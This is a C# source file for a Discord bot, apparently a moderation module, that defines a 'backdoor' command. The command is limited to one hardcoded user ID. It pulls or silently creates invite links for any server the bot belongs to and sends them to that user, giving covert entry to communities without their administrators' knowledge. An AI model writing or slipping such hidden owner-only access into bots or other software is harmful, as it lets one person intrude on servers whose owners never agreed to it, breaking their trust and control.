using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace Hydrobot.Core.Moderation {
    public class Backdoor : ModuleBase<SocketCommandContext> {
        [Command("backdoor"), Summary("Get the invite of a server")]

        public async Task BackdoorModule(ulong GuildID) {
            if (!(Context.User.Id == 140201605512298496)) {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildID).Count() < 1) {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + GuildID);
                return;
            }


            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();

            try {
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1) {
                    await Guild.TextChannels.First().CreateInviteAsync();

                }

                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for guild {Guild.Name}", Guild.IconUrl);
                Embed.WithColor(40, 170, 230);
                foreach (var Current in Invites) {
                    Embed.AddField("Invite:", $"[Invite]({Current.Url})");
                }

                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            } catch (Exception e) {
                await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with error ``{e.Message}``");
                return;
            }

        }



    }
}
